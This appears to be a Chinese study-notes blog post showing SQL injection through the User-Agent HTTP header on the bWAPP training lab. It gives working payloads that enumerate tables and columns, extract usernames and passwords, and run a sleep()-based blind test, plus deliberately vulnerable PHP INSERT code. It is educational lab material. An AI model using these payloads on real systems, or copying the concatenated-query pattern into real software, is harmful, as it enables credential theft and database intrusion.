---
title: 《Web攻防安全实战》学习总结：SQL注入实战——HTTP头盲注
date: 2021-01-09 16:48:24
index_img: /img/websecurity.png
banner_img: /img/websecurity.png
tags:
  - 安全
  - Web安全
categories:
  - Web安全
  - SQL注入
---
# HTTP头盲注
## HTTP头部注入
针对HTTP的请求头，如果不进行过滤和转义，直接与数据库进行交互，就容易被利用进行SQL注入攻击，即HTTP头注入。
## HTTP头盲注实战
### 判断注入点
选择bwapp相应的漏洞靶场SQL Injection - Stored (User-Agent)，页面会记录登录设备的UA和IP。
![fileupload](/img/sql/httpheader/httpheader1.png)
burpsuite抓包修改UA值，发现UA可控，且添加单引号判断存在注入点：
![fileupload](/img/sql/httpheader/httpheader2.png)
![fileupload](/img/sql/httpheader/httpheader3.png)
通过页面判断，ip和UA的值都是由用户输入后端服务的，猜测使用insert ... value ... 语句，构造语句，同时利用 # 闭合sql语句排除干扰，观察页面，ip和UA被成功修改：
![fileupload](/img/sql/httpheader/httpheader4.png)
![fileupload](/img/sql/httpheader/httpheader5.png)
简单构造注入语句，查询数据库名称：
![fileupload](/img/sql/httpheader/httpheader7.png)
![fileupload](/img/sql/httpheader/httpheader8.png)
### 获取用户表名
构造语句获取数据库表：
![fileupload](/img/sql/httpheader/httpheader9.png)
发现每次返回数据行数限制为1行，修改语句再次执行，返回的表名为blog不是用户表：
![fileupload](/img/sql/httpheader/httpheader10.png)
通过offset控制返回第几条，当offset=3时，返回用户表users：
![fileupload](/img/sql/httpheader/httpheader11.png)
```
123',(select table_name from information_schema.tables where table_schema=database() limit 1 offset 3)); #
```
### 获取用户表信息
过程和上述类似，利用以下指令即可查得id,继续利用偏移查询 id login password 分别位于偏移 0, 1, 2 处
```
111', (select column_name from information_schema.columns where table_name='users' limit 1 offset 0)); #
```
![fileupload](/img/sql/httpheader/httpheader12.png)
### 获取用户名密码
```
111', (select login from users limit 1 offset 2)); #
```
将login替换为id、password 同时修改offset值，即可获得相应用户的密码信息。
![fileupload](/img/sql/httpheader/httpheader13.png)

## 漏洞进阶
### 修改靶场代码逻辑
```
// Writes the entry into the database
$sql = "INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '" . sqli($user_agent) . "', '" . $ip_address . "')";
```
原始的逻辑，ip是放在ua之后显示的，现在修改代码逻辑，将ip与ua替换位置：
```
$sql = "INSERT INTO visitors (date, ip_address, user_agent) VALUES (now(), '" . sqli($ip_address) . "', '" . $user_agent . "')";

```
这样处理后，服务端就不会返回我们构造的上述SQL注入语句的执行结果了。
此时可采用基于时间盲注的方式，通过页面的响应时间，判断SQL语句是否成功执行，再通过脚本自动测试完成信息获取：
```
123'+ (select 1 from (select user()) as t where length((select database())) = 5 and sleep(2))); #
```
